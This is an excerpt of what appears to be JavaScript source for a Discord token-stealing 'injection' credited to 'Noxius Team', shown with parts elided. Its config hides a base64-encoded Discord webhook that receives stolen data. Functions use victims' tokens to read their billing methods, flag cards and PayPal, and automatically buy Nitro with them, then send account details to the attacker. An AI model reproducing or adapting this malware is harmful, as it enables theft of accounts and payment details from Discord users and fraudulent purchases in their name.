...
const config = {
  webhook: 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzNTIyNDA4NDMxNDE5Mzk4MS9rUVlxRlh1RGhKUDh1S2RhSUpRWHBRWXBaWW1DNk0yZnMwVW9jSDJWWkgySEVZTmdqa01zSGNIUVhPNHJyZlZZMG9OaQ', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
  webhook_protector_key: '%WEBHOOK_KEY%',
  auto_buy_nitro: true, 
  ping_on_run: true,
  ping_val: '@everyone',
  embed_name: 'MAC10 Injection', 
  embed_icon: 'https://discord.com/channels/1133730742036332584/1133730742694842431/1135240007007862784'.replace(/ /g, '%20'), 
  embed_color: 0x00001,
...
const getBilling = async (token) => {
  ...
  if (!data) return '<a:error:1040628795205488651>';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '<A:_CREDITCARD:1034366627791261706> ';
          break;
        case 2:
  ...
  if (!billing) billing = '<a:error:1040628795205488651>';
  return billing;
};
...
const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase <a:error:1040628795205488651>';
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'Injection by security',
          icon: 'https://discord.com/channels/1133730742036332584/1133730742694842431/1135240007007862784'
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal Added**',
            value: `Time to buy some nitro baby <a:hahaaa:1034201883570606110>`,
            inline: false,
          },
          {
            name: '**Discord Info**',
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'https://projectnoxius.xyz | Developed By Noxius Team',
          icon_url: 'https://discord.com/channels/1133730742036332584/1133730742694842431/1135240007007862784' ,
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'projectnoxius.xyz/discord | Developed by Noxius Team',
          icon_url: 'https://discord.com/channels/1133730742036332584/1133730742694842431/1135240007007862784'
        },
      },
    ],
